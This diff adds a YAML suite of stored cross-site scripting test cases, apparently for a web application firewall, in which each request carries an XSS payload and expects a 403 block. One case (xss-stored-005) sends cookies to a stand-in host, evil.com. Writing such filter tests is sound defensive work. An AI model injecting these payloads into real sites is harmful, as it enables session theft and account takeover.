@@ -1,0 +1,110 @@
+meta:
+  category: "Cross-Site Scripting"
+  subcategory: "Stored XSS"
+  owasp: "A03:2021, WSTG-CLNT-01"
+  severity: "high"
+
+tests:
+  - id: "xss-stored-001"
+    title: "Script tag in comment body"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/comments"
+      headers:
+        Content-Type: "application/json"
+      body: '{"body":"<script>alert(document.cookie)</script>","author":"user1"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-002"
+    title: "IMG tag in profile bio"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "PUT"
+      path: "/api/profile"
+      headers:
+        Content-Type: "application/json"
+      body: '{"bio":"<img src=x onerror=alert(1)>","name":"user1"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-003"
+    title: "Event handler in form field"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/posts"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "title=Hello&content=<div onmouseover=alert(1)>hover me</div>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-004"
+    title: "Script in multipart file upload filename"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/upload"
+      headers:
+        Content-Type: "multipart/form-data; boundary=----FormBoundary"
+      body: "------FormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"<script>alert(1)</script>.txt\"\r\nContent-Type: text/plain\r\n\r\ntest\r\n------FormBoundary--"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-005"
+    title: "XSS in JSON body via nested field"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/settings"
+      headers:
+        Content-Type: "application/json"
+      body: '{"display":{"name":"<script>fetch(\"http://evil.com/\"+document.cookie)</script>"}}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-006"
+    title: "SVG with embedded script"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/avatar"
+      headers:
+        Content-Type: "application/json"
+      body: '{"avatar":"<svg><script>alert(1)</script></svg>"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-007"
+    title: "Anchor tag with javascript protocol"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/links"
+      headers:
+        Content-Type: "application/json"
+      body: '{"url":"javascript:alert(document.domain)","title":"Click me"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-stored-008"
+    title: "Style tag with expression"
+    tags: ["xss", "stored", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/posts"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"<style>body{background:url(javascript:alert(1))}</style>"}'
+    expected:
+      status: 403
+      action: "block"
